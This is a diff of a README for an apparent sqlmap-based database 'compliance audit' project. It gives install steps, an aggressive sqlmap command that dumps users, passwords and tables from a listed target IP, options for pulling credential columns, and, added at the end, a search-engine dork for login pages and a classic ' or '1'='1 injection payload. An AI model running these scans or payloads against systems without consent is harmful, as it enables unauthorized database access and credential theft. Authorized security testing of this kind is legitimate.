@@ -1,17 +1,22 @@
 This project verify that your DataBases are under compliant with the actual DevSecOps MSB
 
-Let’s audit Our Application with https://sqlmap.org {1.4.6.2#dev} 
+Let’s audit Our Application with https://sqlmap.org {1.5.1.17#dev} 
 
 
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
 
 
-1. Install sqlmap
+## 1. Install python 2.7
+
+https://gist.github.com/4k4xs4pH1r3/2196035667b41107d903ebc5a771d956
+
+#
+## 2. Install sqlmap
 
        apt install sqlmap -y && cp -r /usr/share/sqlmap /usr/share/sqlmap_bck && rm -r /usr/share/sqlmap && git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /usr/share/sqlmap && sqlmap --update && sqlmap --version
+       
 #       
-
 ## Generate IP addresses file of your applications (targets)
 
     cd /root && mkdir SA && cd SA && mkdir ad && nano ~/SA/ad/ad_ips
@@ -29,14 +34,16 @@ Let’s audit Our Application with https://sqlmap.org {1.4.6.2#dev}
     -u 'http://10.10.10.140:80/' --level=5 --risk=3 --privileges --current-user --hostname --random-agent --current-db --dump --columns --schema --roles --comments --passwords --users --tables --is-dba --count -b --dbs --mobile --flush-session --check-waf --beep --cleanup --fresh-queries --purge-output --identify-waf --threads=37
 
        
-2. Start & Monitoring
+## Start & Monitoring of the Pipeline CI/CD
 
        cd /root/SA/ad/ && chmod +x SA_sqli.sh && ./SA_sqli.sh
        
        tail -f /root/.sqlmap/output/sqlmap_scan
                
-3. Analize/Purge the Injections Results of each host that you are looking for (CSV format)
-   Include: Target URL; Place; Parameter;	Technique(s) and Note(s) at
+## 3. Analize/Purge the Injections Results
+
+of each host that you are looking for (CSV format) 
+Include: Target URL; Place; Parameter; Technique(s) and Note(s) at
 
        cd
        cd .sqlmap/output/
@@ -44,14 +51,15 @@ Let’s audit Our Application with https://sqlmap.org {1.4.6.2#dev}
 #
 #
 #
-Additional commands
+# Additional commands
 
     -p username --url="http://yourtarget.com//?post=1" --data "username=admin&password=pass"
 
     -D dbname -T tablename -C id -C username -C password
 
-#
-Supported DBMSes are as follows: Firebird, H2, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase.
+# Supported DBMSes are as follows:
+
+Firebird, H2, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase.
      
     --dbms=MySQL
     
@@ -87,3 +95,8 @@ Supported DBMSes are as follows: Firebird, H2, HSQLDB, IBM DB2, Informix, Micros
     $ curl --header 'Host: www.example.com' 'https://127.0.0.1/' -v -k
     
     :)
+
+
+inurl:website.test/login.asp
+
+' or '1'='1
